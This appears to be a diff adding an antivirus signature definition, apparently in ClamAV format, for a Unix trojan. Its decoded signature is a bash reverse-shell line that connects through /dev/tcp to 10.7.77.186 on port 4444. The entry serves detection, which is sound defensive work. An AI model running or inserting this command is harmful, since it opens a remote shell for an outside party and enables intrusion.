@@ -1,0 +1,5 @@
+VIRUS NAME: Unix.Trojan.MSShellcode-18
+TARGET TYPE: ANY FILE
+OFFSET: *
+DECODED SIGNATURE:
+0<&42-;exec 42<>/dev/tcp/10.7.77.186/4444;sh <&42 >&42 2>&42
